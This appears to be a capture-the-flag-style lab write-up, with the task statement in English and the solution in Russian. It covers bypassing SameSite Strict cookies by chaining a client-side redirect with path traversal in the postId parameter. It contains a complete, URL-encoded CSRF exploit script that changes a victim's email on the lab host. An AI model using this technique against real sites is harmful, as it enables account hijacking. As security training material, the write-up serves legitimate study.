# SameSite Strict bypass via client-side redirect
PRACTITIONER

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

## Решение
После оставления комментария пользователь попадает на страницу /post/comment/confirmation?postId=5, на которой есть скрипт, выполняющий клиентское перенаправление:
```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
Он вызывается из тэга script:
```
<script>redirectOnConfirmation('/post');</script>
```
В эксплойте буду использовать тот факт, что значение параметра `postId` добавляется к пути, по которому осуществляется переход. Чтобы попасть с `/post` на `/my-account`, добавлю ".." к началу пути:

`/post/comment/confirmation?postId=../my-account/change-email?email=wiener123@normal-user.net&submit=1&_method=POST`

Закодирую параметры email, submit и _method URL-кодированием, чтобы они не обрабатывались как параметры URL /post/comment/confirmation:

`/post/comment/confirmation?postId=../my-account/change-email%3f%65%6d%61%69%6c%3d%77%69%65%6e%65%72%31%32%33%40%6e%6f%72%6d%61%6c%2d%75%73%65%72%2e%6e%65%74%26%73%75%62%6d%69%74%3d%31%26%5f%6d%65%74%68%6f%64%3d%50%4f%53%54`

Итого:
```
<script>
document.location = "https://0aa6006b0496a534811121fa00e200b0.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3f%65%6d%61%69%6c%3d%77%69%65%6e%65%72%31%32%33%40%6e%6f%72%6d%61%6c%2d%75%73%65%72%2e%6e%65%74%26%73%75%62%6d%69%74%3d%31%26%5f%6d%65%74%68%6f%64%3d%50%4f%53%54";
</script>
```
Задание выполнено.
